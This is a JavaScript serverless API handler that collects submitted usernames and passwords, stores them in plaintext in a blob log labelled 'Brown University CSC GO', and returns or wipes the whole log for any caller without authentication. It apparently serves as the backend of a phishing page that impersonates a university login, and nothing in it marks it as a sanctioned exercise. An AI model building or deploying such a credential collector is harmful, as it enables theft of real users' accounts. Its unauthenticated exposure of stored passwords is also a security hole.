import { list, put } from '@vercel/blob';

const BLOB_PATHNAME = 'submissions-log.json';

async function readLog() {
  const { blobs } = await list({ prefix: BLOB_PATHNAME, limit: 1 });
  const blob = blobs.find((b) => b.pathname === BLOB_PATHNAME);
  if (!blob) {
    return { submissions: [] };
  }

  const response = await fetch(blob.downloadUrl);
  if (!response.ok) {
    throw new Error(`Blob read failed (${response.status})`);
  }

  const parsed = JSON.parse((await response.text()) || '[]');
  const submissions = Array.isArray(parsed) ? parsed : parsed.submissions || [];
  return { submissions };
}

async function writeLog(submissions) {
  await put(BLOB_PATHNAME, JSON.stringify(submissions, null, 2), {
    access: 'private',
    addRandomSuffix: false,
    allowOverwrite: true,
    contentType: 'application/json',
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    if (req.method === 'GET') {
      const { submissions } = await readLog();
      return res.status(200).json({ submissions, source: 'blob' });
    }

    if (req.method === 'POST') {
      const { username, password } = req.body || {};

      if (!username || !password) {
        return res.status(400).json({ error: 'username and password required' });
      }

      const { submissions } = await readLog();
      const entry = {
        username: String(username).trim(),
        password: String(password),
        timestamp: new Date().toISOString(),
        source: 'Brown University CSC GO',
      };

      submissions.unshift(entry);
      await writeLog(submissions);

      return res.status(201).json({ ok: true, count: submissions.length, entry });
    }

    if (req.method === 'DELETE') {
      await writeLog([]);
      return res.status(200).json({ ok: true, count: 0 });
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (error) {
    console.error('submissions API error:', error);
    return res.status(500).json({
      error: 'Storage unavailable',
      detail: error.message,
    });
  }
}
